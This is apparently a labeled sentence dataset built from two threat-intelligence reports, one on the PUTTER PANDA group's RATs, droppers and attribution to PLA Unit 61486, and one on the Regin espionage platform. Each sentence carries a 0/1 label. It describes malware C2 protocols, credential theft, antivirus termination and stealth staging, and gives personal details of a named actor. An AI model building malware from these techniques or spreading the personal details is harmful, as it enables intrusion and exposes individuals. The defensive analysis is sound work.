An album in this site named '' me '' has several shots of what is likely cpyy himself , from 2005 , 2006 , and 2007 , shown to the right : An account on rootkit.com , a popular low-level software security site , existed for user cpyy and was accessed in at least May 2004 .	0
This account was registered with primary email address cpyy @ cpyy.net and backup email address cpyy @ hotmail.com ; it listed a date of birth as 24 May 1979 , consistent with cpyy 's other profiles .	0
The IP address 218.242.252.214 was associated with this account ; it is owned by the Oriental Cable Network Co. , Ltd. , an ISP located in Shanghai .	0
Registration on this forum shows that cpyy had an interest in security-related programming topics , which is backed up by the postings on his personal blog and CSDN account .	0
One of the sites registered to cpyy was used to host a web-based email service , along with a forum on www .	0
cpyy.net .	0
Both of these services were apparently run by the 711 Network Security Team ( 711网络安全小组 ) , a group that is now likely defunct , but has previously published security-based articles that have been re-posted on popular Chinese hacking sites such as xfocus.net .	0
One of these articles , entitled '' IMD-based packet filtering firewall to achieve the principles '' , is apparently authored by xiaobai , with email address xiaobai @ openfind.com.cn ; it was published on the '' GRATEFUL '' ( 饮水思源 ) security digest list that is hosted by Shanghai Jiao Tong University ( SJTU ) .	0
This digest list/bulletin board was also frequented by ClassicWind , an actor possibly linked to the Shanghai-based , PLA-sponsored adversary group COMMENT PANDA , as described in .	0
This Tipper also indicates that '' the Chinese Communist Party ( CCP ) and the People 's Liberation Army ( PLA ) aggressively target SJTU and its School of Information Security Engineering ( SISE ) as a source of research and student recruitment to conduct network offense and defense campaigns '' , so it is possible that the 711 Network Security Team members came to the attention of the Chinese state via this institution .	0
An additional connection to SJTU comes from a C2 domain , checalla.com , used with the 4H RAT in 2008 .	0
This domain was registered to httpchen @ gmail .	0
com at the time , and this address was also used to make a posting on the GRATEFUL BBS ( shown in Figure 7 ) .	0
The posting indicates that httpchen is located at the 闵行 ( Minhang ) campus of SJTU and was posting using IP address 58.196.156.15 , which is associated with the China Education and Research Network ( CERNET ) , a nationwide network managed by the Chinese Ministry of Education .	0
It also states that httpchen is studying at the school of Information Security Engineering within SJTU .	0
Several pieces of evidence indicate that cpyy probably has connections to , or is part of , the Chinese military – specifically the PLA Army .	0
In addition to his declaration on his personal blog that he works for the '' military/ police '' , and contacts with actors such as Linxder that have been previously associated with hacking units within the PLA , cpyy 's Picasa site contains several photographs that hint at military connections .	0
First , a monochrome picture from the 大学时代 ( '' college '' ) album posted in February 2007 shows several uniformed individuals : It is not clear whether this picture includes cpyy , or just friends/ associates/relatives .	0
A picture from the 中学时代 ( '' high school '' ) album posted in February 2007 shows a male – likely cpyy based on the clothing shown in the second picture , which matches the pictures of cpyy shown above – performing exercise in front of a group of likely soldiers and an officer : Although somewhat unclear , pictures from the album 2002年的生日 ( '' 2002 birthday '' ) , also posted in February 2007 , show the celebrant ( likely cpyy ) in khaki clothes that are possibly military wear .	0
The most compelling pictures , however , are found in the 宿舍 and 办公室 albums ( '' dormitory '' and '' office '' ) .	0
A shot of probably cpyy 's dormitory room shows in the background two military hats that appear to be Type 07 PLA Army officer peak hats : 18 This album also contains a shot of the exterior of a building with several large satellite dishes outside : This same building and the satellite dishes also appear in the '' office '' album .	0
The reflection effects observed on the windows of this building could be due to coatings applied to resist eavesdropping via laser microphones and to increase privacy , which would be consistent with a military installation conducting sensitive work .	0
Above is an image from the same album of what appears to be a larger dish , in front of the Oriental Pearl Tower , a significant landmark in Shanghai : As mentioned above , checalla.com was used for command and control with the PUTTER PANDA 4H RAT in 2008 .	0
This domain was registered to httpchen @ gmail.com , and in May 2009 the domain registration details were updated to include a Registrant Address of '' shanghai yuexiulu 46 45 202 # '' .	0
A search for this location reveals an area of Shanghai shown in Figure 8 .	0
Figure 9 shows an enlargement of satellite imagery from within this area , depicting a facility containing several satellite dishes within green areas , sports courts and a large office building .	0
Satellite imagery from 2009 showing another aspect of this office building , along with a likely vantage point and direction of camera , alongside probably cpyy 's photograph from the same angle , is shown in Figure 10 : Based on the Shanghai location , and common features , it is highly likely that the location shown above is the same as that photographed by cpyy and shown in the '' office '' and '' dormitory '' albums .	0
Further confirmation can be found from photos uploaded by a user on Panoramio who tags the image as being located in Chabei , Shanghai , China ( 31° 17 ' 18.86 '' N 121° 27 ' 9.83 '' E ) .	0
This image is exceptionally similar to building shown in cpyy 's '' office '' album ( see Figure 11 below ) .	0
According to a public report on the Chinese PLA 's General Staff Department ( GSD ) , the 12th Bureau of the 3rd GSD is headquartered in the Zhabei district of Shanghai and '' appears to have a functional mission involving satellites , likely inclusive of intercept of satellite communications and possibly space-based SIGINT collection '' .	0
The same report also lists a Military Unit Cover Designator ( MUCD ) of 61486 for this bureau .	0
A webpage published on a Chinese government site detailing theatrical performances involving members of the PLA lists an address of '' 闸北区粤秀路46号 '' ( 46 Yue Xiu Road , Zhabei District ) for '' 总参61486部队 '' ( 61486 Forces General Staff ) .	0
A search for this location shows an identical area to that shown in Figure 8 .	0
It can therefore be concluded with high confidence that the location shown in cpyy 's imagery , along with the satellite images above , is the headquarters of the 12th Bureau , 3rd GSD , Chinese PLA – also known as Unit 61486 .	0
This unit 's suspected involvement in '' space surveillance '' and '' intercept of satellite communications '' fits with their observed targeting preferences for Western companies producing technologies in the space and imaging/remote sensing sectors .	0
The size and number of dishes present in the area is also consistent with these activities .	0
Observed build times for the PUTTER PANDA tools described in this report range from 2007 to late 2013 , indicating that the actors have conducted several campaigns against their objectives over a period of several years .	0
A build time analysis of all known samples is shown in Figure 1 below , relative to China time .	0
Although this shows that there is some bias in the build time distribution to daylight or working hours in China , which is more significant if a possible three-shift system of hours is considered ( 0900-1200 , 1400-1700 , and 2000-2300 ) , this evidence is not conclusive .	0
There is also some evidence that build times are manipulated by the adversary ; for example , the sample with MD5 hash bc4e9dad71b844dd3233cfbbb96c1bd3 has a build time of 18 July 2013 , but was supposedly first submitted to VirusTotal on 9 January 2013 .	0
This shows that the attackers – at least in 2013 – were aware of some operational security considerations and were likely taking deliberate steps to hide their origins .	0
There is strong evidence to tie cpyy , an actor who appears to have been involved in historical PUTTER PANDA operations , to the PLA army and a location in Shanghai that is operated by the 12th Bureau , 3rd GSD of the PLA ( Unit 61486 ) .	0
Another actor tied to this activity , httpchen , has declared publically that he was attending the School of Information Security Engineering at SJTU .	0
This university has previously been posited as a recruiting ground for the PLA to find personnel for its cyber intelligence gathering units , and there is circumstantial evidence linked cpyy to other actors based at SJTU .	0
Given the evidence outlined above , CrowdStrike attributes the PUTTER PANDA group to PLA Unit 61486 within Shanghai , China with high confidence .	0
It is likely that this organization is staffed in part by current or former students of SJTU , and shares some resources and direction with PLA Unit 61398 ( COMMENT PANDA ) .	0
Several RATs are used by PUTTER PANDA .	1
The most common of these , the 4H RAT and the 3PARA RAT , have been documented previously by CrowdStrike in previous CrowdStrike Intelligence reporting .	0
This analysis will be revisited below , along with an examination of two other PUTTER PANDA tools : pngdowner and httpclient .	0
Two droppers have been associated with the PUTTER PANDA toolset ; these are also briefly examined below .	1
This RAT was first analyzed by CrowdStrike in April 2012 , but a historical analysis shows that it has been in use since at least 2007 by the PUTTER PANDA actors .	0
A listing of metadata for known samples , including C2 information , is shown in Appendix 1 .	0
The operation of this RAT is described in detail in other CrowdStrike reporting , but is useful to revisit here to highlight the characteristics of the RAT : • C2 occurs over HTTP , after connectivity has been verified by making a distinctive request ( to the URI / search ? qu= at www.google.com ) .	1
• A victim identifier is generated from the infected machine 's hard disk serial number , XOR'ed with the key ldd46 ! yo , and finally nibble-wise encoded as upper-case ASCII characters in the range ( A-P ) – e.g. , the byte value 0x1F becomes '' BP '' .	1
• A series of HTTP requests characterizes the RAT 's C2 .	1
The initial beacon uses a request with four parameters ( h1 , h2 , h3 , and h4 ) – as shown in Figure 8 – to register the implant with the C2 server .	1
• Communication to and from the C2 server is obfuscated using a 1-byte XOR with the key 0xBE .	1
• The commands supported by the RAT enable several capabilities , including : The 3PARA RAT was described in some detail in other CrowdStrike reporting , which examined a DLL-based sample with an exported filename of ssdpsvc.dll .	1
Other observed exported filenames are msacem.dll and mrpmsg.dll , although the RAT has also been observed in plain executable ( EXE ) format .	0
On startup , the RAT attempts to create a file mapping named & *SDKJfhksdf89*DIUKJDSF & *sdfsdf78sdfsdf .	1
This is used to prevent multiple instances of the RAT being executed simultaneously .	1
The RAT will then use a byte-wise subtraction- based algorithm ( using a hard-coded modulo value ) to decode C2 server details consisting of a server hostname and port number , in this example nsc.adomhn . com , port 80 .	1
The decoding algorithm is illustrated in Figure 10 below .	0
The key and modulo values vary on a per-sample basis .	0
Decoded C2 settings , along with sample metadata , are listed in Appendix 2 .	0
The RAT is programmed in C++ using Microsoft Visual Studio , and it makes use of the object-oriented and parallel programming features of this environment ; Standard Template Library ( STL ) objects are used to represent data structures such as strings and lists , and custom objects are used to represent some of the C2 command handlers ( e.g. , CCommandCMD ) .	0
Several threads are used to handle different stages of the C2 protocol , such as receiving data from the server , decrypting data , and processing commands .	1
Standard Windows primitives such as Events are used to synchronize across these threads , with a shared global structure used to hold state .	0
Once running , the RAT will load a binary representation of a date/time value from a file C : \RECYCLER\restore.dat , and it will sleep until after this date/time has passed .	1
Database provides a mechanism for the operators to allow the RAT to remain dormant until a fixed time , perhaps to allow a means of regaining access if other parts of their toolset are removed from a victim system .	1
As with the 4H RAT , the C2 protocol used by the 3PARA RAT is HTTP based , using both GET and POST requests .	1
An initial request is made to the C2 server ( illustrated in Figure 11 above ) , but the response value is effectively ignored ; it is likely that this request serves only as a connectivity check , as further C2 activity will only occur if this first request is successful .	1
In this case , the RAT will transmit some basic victim information to the C2 server along with a 256-byte hash of the hard-coded string HYF54 & % 9 & jkMCXuiS .	1
It is likely that this request functions as a means to authenticate the RAT to the C2 server and register a new victim machine with the controller .	1
A sample request and its structure are shown in Figure 12 .	0
If this request is also successful , the RAT will attempt to retrieve tasking from the controller using a further distinctive HTTP request shown in Figure 13 , repeating this request every two seconds until valid tasking is returned .	1
Returned tasking is decrypted using the DES algorithm in CBC mode with a key derived from the MD5 hash of the string HYF54 & % 9 & jkMCXuiS ( as used in the secondary beacon shown above ) .	0
If this fails , the RAT will fall back to decoding the data using an 8-byte XOR with a key derived from data returned from the HashData API with the same key string .	0
Output data produced by tasking instructions is encrypted in the same manner as it was decrypted and sent back to the C2 server via HTTP POST request to a URI of the form /microsoft/errorpost/ default.aspx ? ID= , where the ID value is a random number in decimal representation – as with the initial request shown in Figure 4 .	1
The set of commands supported by the RAT is somewhat limited , indicating that perhaps the RAT is intended to be used as a second-stage tool , or as a failsafe means for the attackers to regain basic access to a compromised system ( which is consistent with its support for sleeping until a certain date/time ) .	1
Some of the supported commands are implemented using C++ classes derived from a base CCommand class : •C CommandAttribe – Retrieve metadata for files on disk , or set certain attributes such as creation/ modification timestamps .	0
• CCommandCD – Change the working directory for the current C2 session .	0
•C CommandCMD – Execute a command , with standard input/output/error redirected over the C2 channel .	0
• CCommandNOP – List the current working directory .	0
However , other commands are not implemented in this way .	0
These other commands contain functionality to : • Pause C2 activity for a random time interval .	0
• Shutdown C2 activity and exit .	0
•P rovide a date and time before which beaconing will not resume , recorded in the file C : \RECYCLER\ restore.dat as noted above .	0
The use of C++ classes that inherit from a base class to carry out some of the tasking commands , along with the use of concurrency features , indicates that the developers of the RAT put some thought into the architecture and design of their tool , although the decision to implement some commands outside of the class-based framework is curious , and may indicate multiple developers worked on the RAT ( or a single developer with shifting preferences for his coding style ) .	0
The pngdowner malware is a simple tool constructed using Microsoft Visual Studio and implemented via single C++ source code file .	0
This sample contains a PDB path of Y : \Visual Studio 2005\Projects\branch-downer\ downer\Release\downer.pdb , but other similar paths Z : \Visual Studio 2005\Projects\pngdowner\Release\ pngdowner.pdb and Z : \Visual Studio 2005\Projects\downer\Release\downer.pdb have also been observed in other samples .	0
Appendix 3 lists metadata for known pngdowner samples .	0
Initially , the malware will perform a connectivity check to a hard-coded URL ( http : //www.microsoft.com ) , using a constant user agent Mozilla/4.0 ( Compatible ; MSIE 6.0 ; ) .	1
If this request fails , the malware will attempt to extract proxy details and credentials from Windows Protected Storage , and from the IE Credentials Store using publicly known methods15 , using the proxy credentials for subsequent requests if they enable outbound HTTP access .	1
An initial request is then made to the hard-coded C2 server and initial URI – forming a URL of the form ( in this sample ) http : //login.stream-media.net/files/xx11/index.asp ? 95027775 , where the numerical parameter represents a random integer .	1
A hard-coded user agent of myAgent is used for thisrequest , and subsequent communication with the C2 server .	0
Content returned from this request to the C2 server will be saved to a file named index.dat in the user's temporary directory ( i.e. , % TEMP % ) .	0
This file is expected to contain a single line , specifying a URL and a filename .	0
The malware will then attempt to download content from the specified URL to the filename within the user 's temporary directory , and then execute this file via the WinExec API .	1
If this execution attempt succeeds , a final C2 request will be made – in this case to a URL using the same path as the initial request ( and a similarly random parameter ) , but with a filename of success.asp .	1
Content returned from this request will be saved to a file , but then immediately deleted .	0
Finally , the malware will delete the content saved from the first request , and exit .	1
The limited functionality , and lack of persistence of this tool , implies that it is used only as a simple download- and-execute utility .	1
Although the version mentioned here uses C++ , along with Visual Studios Standard Template Library ( STL ) , older versions of the RAT ( such as MD5 hash b54e91c234ec0e739ce429f47a317313 ) , built in 2011 , use plain C. This suggests that despite the simple nature of the tool , the developers have made some attempts to modify and perhaps modernize the code .	0
Both versions contain debugging/progress messages such as '' down file success '' .	0
Although these are not displayed to the victim , they were likely used by the developers as a simple means to verify functionality of their code .	0
Like pngdowner , the httpclient malware is a simple tool that provides a limited range of functionality and uses HTTP for its C2 channel .	1
This malware also initially performs a connectivity check to www.microsoft.com using the hard-coded user agent Mozilla/4.0 ( Compatible ; MSIE 6.0 ; ) , although in this variant no attempt is made to extract proxy credentials .	1
The malware will then connect to its configured C2 infrastructure ( file.anyoffice.info ) and perform a HTTP request of the form shown in Figure 14 below : Content returned from the C2 server is deobfuscated by XOR'ing the content with a single byte , 0x12 .	1
The decoded data is then checked for the string runshell .	0
If this string is not present , the C2 request is repeated every 0.5 seconds .	1
Otherwise , a shell process is started ( i.e. , cmd.exe ) , with input/output redirected over the C2 channel .	1
Shell commands from the server are followed by an encoded string $ $ $ , which indicates that the shell session should continue .	0
If the session is ended , two other commands are supported : m2b ( upload file ) and b2m ( download file ) .	1
Slight variations on the C2 URLs are used for different phases of the C2 interaction : Given the lack of a persistence mechanism and low level of sophistication , it is likely that httpclient – like pngdowner – is used as a second-stage or supplementary/backup tool .	0
Appendix 4 lists metadata for observed httpclient samples .	0
Other CrowdStrike reporting describes a dropper used by PUTTER PANDA ( abc.scr ) to install the 4H RAT .	1
This dropper uses RC4 to decrypt an embedded payload from data in an embedded resource before writing the payload to disk and executing it .	1
Several instances of this dropper have been observed , most commonly in association with the 4H RAT , but also in relation to other tools that will be described in forthcoming reporting .	0
Another dropper has been observed , exclusively installing the pngdowner malware ( example MD5 hash 4c50457c35e2033b3a03fcbb4adac7b7 ) .	1
This dropper is simplistic in nature , and is compiled from a single C++ source code file .	0
It contains a Word document in plaintext ( written to BienvenueaSahajaYogaToulouse .	0
doc ) , along with an executable ( Update.exe ) and DLL ( McUpdate.dll ) .	0
The executable and DLL are both contained within the .data	1
section of the dropper , obfuscated with a 16-byte XOR key ( consisting of the bytes 0xA0 – 0xAF ) .	1
Both the document and executable are written to disk and the executed via the ShellExecute API ( using the verb '' open '' ) .	1
The executable is also installed into the ASEP registry key HKCU\Software\Microsoft\Windows\ CurrentVersion\Run , with a value named McUpdate .	1
Finally , the dropper deletes itself via a batch file .	1
The dropped executable ( MD5 hash 38a2a6782e1af29ca8cb691cf0d29a0d ) primarily aims to inject the specified DLL ( McUpdate.dll , MD5 hash 08c7b5501df060ccfc3aa5c8c41b452f ) into a process that would normally be accessing the network , likely in order to disguise the malicious activity .	1
Module names corresponding to Outlook Express ( msinm.exe ) , Outlook ( outlook.exe ) , Internet Explorer ( iexplore.exe ) , and Firefox ( firefox.exe ) are used .	0
If Internet Explorer is used , then the malware will attempt to terminate processes corresponding to two components of Sophos Anti-Virus ( SAVAdminService.exe and SavService.exe ) .	1
Four examples of these droppers were located , using a mixture of decoy PDF and Microsoft Word documents ( shown below in Figures 15-18 ) .	1
The common theme throughout these documents is space technology ( BienvenueaSahajaYogaToulouse.doc does not follow this trend , but could be targeted at workers at the Toulouse Space Centre , the '' largest space centre in Europe '' ) , indicating that the attackers have a keen interest in this sector , which is also reflected in the choice of name for some of the C2 domains used ( see the Attribution section above ) .	0
A number of specific and generic detection methods are possible for this RAT , both on a host and on the network .	0
These are detailed below , and are designed to expand upon the indicators reported in other CrowdStrike reporting .	0
The following Windows registry artifacts are indicative of a compromised host : redacted ) The presence of the following file system artifacts is indicative of a compromised host : A file mapping named & *SDKJfhksdf89*DIUKJDSF & *sdfsdf78sdfsdf also indicates the victim machine is compromised with PUTTER PANDA malware .	0
In addition the domains listed in the Appendices and in the Attribution section , the generic signatures below can be used to detect activity from the malware described in this report .	0
In addition to the indicators described above , PUTTER PANDA have some distinct generic TTPs : PUTTER PANDA are a determined adversary group who have been operating for several years , conducting intelligence-gathering operations with a significant focus on the space sector .	0
Although some of their tools are simplistic , taken as a whole their toolset provides a wide degree of control over a victim system and can provide the opportunity to deploy additional tools at will .	1
Research presented in this report shows that the PUTTER PANDA operators are likely members of the 12th Bureau , 3rd General Staff Department ( GSD ) of the People 's Liberation Army ( PLA ) , operating from the unit 's headquarters in Shanghai with MUCD 61486 .	0
Strategic objectives for this unit are likely to include obtaining intellectual property and industrial secrets relating to defense technology , particularly those to help enable the unit 's suspect mission to conduct space surveillance , remote sensing , and interception of satellite communications .	0
PUTTER PANDA is likely to continue to aggressively target Western entities that hold valuable information or intellectual property relevant to these interests .	0
The detection and mitigation guidance given in this report will help to minimize the risk of a successful compromise by these actors , and future CrowdStrike reports will examine other elements of the PUTTER PANDA toolset .	0
CrowdStrike Falcon Intelligence portal provides enterprises with strategic , customized , and actionable intelligence .	0
Falcon Intelligence enables organizations to prioritize resources by determining targeted versus commodity attacks , saving time and focusing resources on critical threats .	0
With unprecedented insight into adversary tools , tactics , and procedures ( TTPs ) and multi-source information channels , analysts can identify pending attacks and automatically feed threat intelligence via API to SIEM and thirdparty security tools .	0
Access to CrowdStrike Falcon Intelligence is geared toward all levels of an organization , from the executivewho needs to understand the business threat and strategic business impact , to the front-line securiyt professional struggling to ! ght through an adversary's attack against the enterprise .	0
CrowdStrike Falcon Intelligence is a web-based intelligence subscription that includes full access to a variety of feature sets , including : CrowdStrike Falcon Host is an endpoint threat detection and response product that identifies unknown malware , detects zero-day threats , and prevents damage from targeted attacks in real-time .	0
Falcon Host is comprised of two core components , the cloud-based management console and the on-premises host-based sensor that continuously monitors threat activity at the endpoint to prevent damage in real-time .	0
Falcon Host leverages a lightweight kernel-mode sensor that shadows , captures , and correlates low- level operating system events to instantly identify the adversary tradecraft and activities through Stateful Execution Inspection ( SEI ) at the endpoint and Machine Learning in the cloud .	0
As opposed to focusing on malware signatures , indicators of compromise , exploits , and vulnerabilities , Falcon Host instead identifies mission objectives of the adversary leveraging the Kill Chain model and provides realtime detection by focusing on what the attacker is doing , as opposed to looking nfor a specific , easily changeable indicator used in an attack .	0
Without performing intrusive and performance- impacting scans of the system , Falcon Host 's highly efficient real-time monitoring of all system activity is the only security solution that provides maximum visibility into all adversary activities , including Adversary-in-Motion : reconnaissance , exploitation , privilege escalation , lateral movement , and exfiltration .	0
Falcon Host delivers insight into past and current attacks not only on a single host , but also across devices and networks .	0
Stateful Execution inspection Stateful Execution Inspection ( SEI ) tracks execution state and links together various stages of the kill chain , from initial code execution to data exfiltration .	0
CrowdStrike 's Real-time Stateful Execution Engine performs inspection and analysis to understand the full context of a cyber attack .	0
SEI is critical to understanding the entire attack life cycle and preventing the damage from advanced malware and targeted attacks .	0
Existing security technologies that focus solely on malware signatures , incidators of compromise , exploits , and vulnerabilities fail to protect against the majority of attacks as they are blind to the full scope of adversary activity .	0
CrowdStrike is a global provider of security technology and services focused on identifying advanced threats and targeted attacks .	0
Using big-data technologies , CrowdStrike 's next-generation threat protection platform leverages real-time Stateful Execution Inspection ( SEI ) at the endpoint and Machine Learning in the cloud instead of solely focusing on malware signatures , indicators of compromise , exploits , and vulnerabilities .	0
The CrowdStrike Falcon Platform is a combination of big data technologies and endpoint security driven by advanced threat intelligence .	0
CrowdStrike Falcon enables enterprises to identify unknown malware , detect zero-day threats , pinpoint advanced adversaries and attribution , and prevent damage from targeted attacks in real time .	0
CrowdStrike Services is a wholly owned subsidiary of CrowdStrike responsible for proactively defending against and responding to cyber incidents with pre and post Incident Response services .	0
CrowdStrike 's seasoned team of Cyber Intelligence professionals , Incident Responders , and Malware Researchers consists of a number of internationally recognized authors , speakers , and experts who have worked on some of the most publicized and challenging intrusions and malware attacks in recent years .	0
The CrowdStrike Services team leverages our Security Operations Center to monitor the full CrowdStrike Falcon Platform and provide cutting-edge advanced adversary intrusion detection services .	0
The full spectrum of proactive and response services helps customers respond tactically as well as continually mature and strategically evolve Incident Response program capabilities .	0
In the world of malware threats , only a few rare examples can truly be considered groundbreaking and almost peerless .	0
What we have seen in Regin is just such a class of malware .	0
Regin is an extremely complex piece of software that can be customized with a wide range of different capabilities which can be deployed depending on the target .	1
It is built on a framework that is designed to sustain long-term intelligence-gathering operations by remaining under the radar .	1
It goes to extraordinary lengths to conceal itself and its activities on compromised computers .	1
Its stealth combines many of the most advanced techniques that we have ever seen in use .	0
The main purpose of Regin is intelligence gathering and it has been implicated in data collection operations against government organizations , infrastructure operators , businesses , academics , and private individuals .	1
The level of sophistication and complexity of Regin suggests that the development of this threat could have taken well-resourced teams of developers many months or years to develop and maintain .	0
Regin is a multi-staged , modular threat , meaning that it has a number of components , each depending on others , to perform attack operations .	0
This modular approach gives flexibility to the threat operators as they can load custom features tailored to individual targets when required .	0
Some custom payloads are very advanced and exhibit a high degree of expertise in specialist sectors .	0
The modular design also makes analysis of the threat difficult , as all components must be available in order to fully understand it .	1
This modular approach has been seen in other sophisticated malware families such as Flamer and Weevil ( The Mask ) , while the multi-stage loading architecture is similar to that seen in the Duqu/Stuxnet family of threats .	0
Regin is different to what are commonly referred to as '' traditional '' advanced persistent threats ( APTs ) , both in its techniques and ultimate purpose .	0
APTs typically seek specific information , usually intellectual property .	1
Regin 's purpose is different .	0
It is used for the collection of data and continuous monitoring of targeted organizations or individuals .	1
This report provides a technical analysis of Regin based on a number of identified samples and components .	0
This analysis illustrates Regin 's architecture and the many payloads at its disposal .	0
Regin is a multi-purpose data collection tool which dates back several years .	0
Symantec first began looking into this threat in the fall of 2013 .	0
Multiple versions of Regin were found in the wild , targeting several corporations , institutions , academics , and individuals .	0
Regin has a wide range of standard capabilities , particularly around monitoring targets and stealing data .	1
It also has the ability to load custom features tailored to individual targets .	0
Some of Regin 's custom payloads point to a high level of specialist knowledge in particular sectors , such as telecoms infrastructure software , on the part of the developers .	0
Regin is capable of installing a large number of additional payloads , some highly customized for the targeted computer .	1
The threat 's standard capabilities include several remote access Trojan ( RAT ) features , such as capturing screenshots and taking control of the mouse 's point-and-click functions .	1
Regin is also configured to steal passwords , monitor network traffic , and gather information on processes and memory utilization .	1
It can also scan for deleted files on an infected computer and retrieve them .	1
More advanced payload modules designed with specific goals in mind were also found in our investigations .	0
For example , one module was designed to monitor network traffic to Microsoft Internet Information Services ( IIS ) web servers , another was designed to collect administration traffic for mobile telephony base station controllers , while another was created specifically for parsing mail from Exchange databases .	1
Regin goes to some lengths to hide the data it is stealing .	1
Valuable target data is often not written to disk .	1
In some cases , Symantec was only able to retrieve the threat samples but not the files containing stolen data .	0
Symantec is aware of two distinct versions of Regin .	0
Version 1.0 appears to have been used from at least 2008 to 2011 .	0
Version 2.0 has been used from 2013 onwards , though it may have possibly been used earlier .	0
Version 1.0 appears to have been abruptly withdrawn from circulation in 2011 .	0
Version 1.0 samples found after this date seem to have been improperly removed or were no longer accessible to the attackers for removal .	0
This report is based primarily on our analysis of Regin version 1.0 .	0
We also touch on version 2.0 , for which we only recovered 64-bit files .	0
Symantec has assigned these version identifiers as they are the only two versions that have been acquired .	0
Regin likely has more than two versions .	0
There may be versions prior to 1.0 and versions between 1.0 and 2.0 .	0
The Regin operators do not appear to focus on any specific industry sector .	0
Regin infections have been observed in a variety of organizations , including private companies , government entities , and research institutes .	0
Infections are also geographically diverse , having been identified mainly in 10 different regions .	0
The infection vector varies among targets .	0
A reproducible infection vector is unconfirmed at time of writing .	0
Targets may be tricked into visiting spoofed versions of well- known websites and the threat may be installed through a web browser or by exploiting an application .	1
On one computer , log files show that Regin originated from Yahoo ! Instant Messenger through an unconfirmed exploit .	1
Regin has a six-stage architecture .	0
The initial stages involve the installation and configuration of the threat 's internal services .	1
The later stages bring Regin 's main payloads into play .	0
This section presents a brief overview of the format and purpose of each stage .	0
The most interesting stages are the executables and data files stored in Stages 4 and 5 .	0
The initial Stage 1 driver is the only plainly visible code on the computer .	0
All other stages are stored as encrypted data blobs , as a file or within a non-traditional file storage area such as the registry , extended attributes , or raw sectors at the end of disk .	1
Symantec Security Response has not obtained the Regin dropper at the time of writing .	0
Symantec believes that once the dropper is executed on the target 's computer , it will install and execute Stage 1 .	1
It 's likely that Stage 0 is responsible for setting up various extended attributes and/or registry keys and values that hold encoded versions of stages 2 , 3 , and potentially stages 4 and onwards .	1
The dropper could be transient rather than acting as an executable file and may possibly be part of the infection vector exploit code .	0
Stage 1 is the initial load point for the threat .	1
There are two known Stage 1 file names : These are kernel drivers that load and execute Stage 2 .	1
These kernel drivers may be registered as a system service or may have an associated registry key to load the driver while the computer is starting up .	1
Stage 1 simply reads and executes Stage 2 from a set of NTFS extended attributes .	1
If no extended attributes are found , Stage 2 is executed from a set of registry keys .	1
Stage 2 is a kernel driver that simply extracts , installs and runs Stage 3 .	1
Stage 2 is not stored in the traditional file system , but is encrypted within an extended attribute or a registry key blob .	1
Stage 2 can be found encrypted in : This stage can also hide running instances of Stage 1 .	1
Once this happens , there are no remaining plainly visible code artifacts .	0
Similar to previous stages , Stage 2 finds and loads an encrypted version of Stage 3 from either NTFS extended attributes or a registry key blob .	1
Stage 2 can also monitor the state of the threat .	1
This stage drops the file msrdc64.dat , which appears to always be 512 bytes in size .	1
The first two bytes are used and the remaining bytes are set to zero .	0
The second byte indicates the exclusive maximum number of instances allowed to run , which is set to two .	0
This means no more than one instance should run at any time .	0
The first byte indicates how many instances were run or attempted to run .	0
Therefore , the potential combinations for the first two bytes are : Stage 3 is a kernel mode DLL and is not stored in the traditional file system .	0
Instead , this file is encrypted within an extended attribute or registry key blob .	1
Stage 3 can be found in the following locations : The file is six to seven times the size of the driver in Stage 2 .	0
In addition to loading and executing Stage 4 , Stage 3 offers a framework for the higher level stages .	1
Stages 3 and above are based on a modular framework of code modules .	0
These modules offer functions through a private , custom interface .	0
Each file in stages 3 and above can '' export '' functionality to other parts of Regin .	0
In the case of Stage 3 , the following primitives are offered : These primitives are provided through a custom export methodology .	0
The Stage 3 DLL exports a wide range of functionality through a custom export methodology .	0
The interface used to export functionality does not make use of the traditional Windows DLL export mechanism by name or ordinal .	0
Exported Regin methods are referenced by a tuple consisting of a major and minor number .	0
Stage 3 exports hundreds of methods , organized into 12 different major groups .	0
The numbers used vary across versions .	0
We acquired artifacts using two different numbering schemes .	0
Table 2 is an example listing .	0
With Regin 's modular nature , Stage 4 kernel modules and Stage 5 user modules ( payloads ) can provide functionality and export routines using the same major and minor numbering scheme .	0
The files for Stage 4 , which are loaded by Stage 3 , consist of a user-mode orchestrator and multiple kernel payload modules .	1
They are stored in two EVFS containers as files : • % System % \config\SystemAudit.Evt : Contains Stage 4 kernel drivers , which constitute the kernel mode part of Regin 's payload .	0
• % System % \config\SecurityAudit.Evt : Contains a user mode version of Stage 3 .	0
The files are injected into services.exe .	0
When the attackers who operated Regin cleaned up compromised computers once they were finished with them , they often failed to remove Stage 4 and 5 artifacts from the system .	1
Stage 4 also uses the same export methodology described in Stage 3 .	0
Stage 5 consists of the main Regin payload functionality .	0
The files for Stage 5 are injected into services.exe by Stage 4 .	1
Stage 5 files are EVFS containers containing other files : Regin 's payload involves the DLLs contained in the SystemLog.evt EVFS container .	0
The payload functionality differs depending on the targeted computer .	0
Custom payload files will likely be delivered for each specific environment .	0
Example payload functionality seen to date includes : Regin stores data files and payloads on disk in encrypted virtual file system files .	1
Such files are accessed by the major routines 3Dh .	0
Files stored inside EVFS containers are encrypted with a variant of RC5 , using 64-bit blocks and 20 rounds .	1
The encryption mode is reverse cipher feedback ( CFB ) .	1
Known extensions for EVFS containers are *.evt and *.imd .	0
The structure of a container is similar to the FAT file system .	0
One major difference is that files do not have a name ; instead , they 're identified using a binary tag .	0
The tag itself is the concatenation of a major number and a minor number .	0
The major number typically indicates the major function group that will handle the file .	0
A container starts with the header in Table 3 ( little-endian ordering ) .	0
The header is followed by the file entry table ( Table 4 ) .	0
Each file entry is 13h+taglen bytes long .	0
The sectors follow ( Table 5 ) .	0
A sector of sectsize bytes starts with a DWORD pointing to the next sector ( if the file does not fit within single sector ) , followed by sectsize-4 bytes of payload data .	0
As explained above , the files are encrypted .	1
Other layers of encryption and compression may also be in place , although those would be handled by higher level components .	0
Regin 's C & C operations are extensive .	1
These backchannel operations are bidirectional , which means either the attackers can initiate communications with compromised computers on the border network or the compromised computers can initiate communications with the attacker .	1
Furthermore , compromised computers can serve as a proxy for other infections and command and control can also happen in a peer-to-peer fashion .	1
All communications are strongly encrypted and can happen in a two-stage fashion where the attacker may contact a compromised computer using one channel to instruct it to begin communications on a different channel .	1
Four transport protocols are available for C & C : • ICMP : Payload information can be encoded and embedded in lieu of legitimate ICMP/ping data .	1
The string 'shit ' is scattered in the packet for data validation .	0
In addition , CRC checks use the seed '31337 ' .	0
• HTTP : Payload information can be encoded and embedded within cookie data under the names SESSID , SMSWAP , TW , WINKER , TIMESET , LASTVISIT , AST.NETSessionId , PHPSESSID , or phpAdsd .	1
